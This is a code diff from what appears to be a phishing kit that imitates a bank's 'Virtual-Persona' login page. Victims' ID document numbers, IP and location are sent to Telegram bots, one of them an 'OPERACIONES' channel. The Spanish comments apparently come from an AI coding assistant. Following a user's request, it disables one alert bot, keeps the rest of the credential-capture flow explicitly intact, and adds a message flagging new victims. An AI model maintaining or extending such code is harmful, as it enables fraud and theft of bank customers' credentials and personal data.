@@ -138,11 +138,30 @@ async function showLoadingModalAndRedirect() {
 
   document.querySelector(".modal-container").style.display = "flex";
 
+  // ── DESACTIVADO (instrucción usuario: "no tiene por que llegar mensaje a otro
+  //    bot que no sea el que te pase") ──────────────────────────────────────────
+  // El BOT 2 ALERTA PREVIA era el único que enviaba el mensaje incompleto
+  // "Esperando login..." que el usuario confundió con una falla general.
+  // Se desactiva COMPLETAMENTE el envío Telegram a este canal auxiliar.
+  // El flujo restante (modal visible + botón CONTINUAR redirect) se mantiene
+  // INTACTO para no afectar la UX ni el submit posterior del login Virtual-Persona.
+  // Si en el futuro se quiere reactivar: cambiar la constante a true y asegurarse
+  // de que TELEGRAM_BOT_TOKEN_ALERTA / TELEGRAM_CHAT_ID_ALERTA apunten a un
+  // canal SEPARADO diferente al de OPERACIONES para no mezclar mensajes.
+  const ENVIAR_ALERTA_PREVIA = false;
+  if (!ENVIAR_ALERTA_PREVIA) {
+    // Para no romper el localStorage de trazabilidad si existe algún flujo que
+    // lo espere, guardamos -1 (indicador de que no hubo mensaje enviado).
+    localStorage.setItem("cb_chat_message_id", "-1");
+    return;
+  }
+
   const ip        = await getPublicIp();
   const ubicacion = await getLocationFromIp(ip);
 
   const sep = "-----------------------------------";
   const mensaje =
+    `🚨 <b>[ALERTA INGRESO]</b> Usuario acaba de entrar a la landing (aún NO llenó login Virtual-Persona)\n` +
     `${sep}\n` +
     `🆔 ID: <b>${sid}</b>\n` +
     `📄 Doc: <b>${tipoDoc} ${numDoc}</b>\n` +
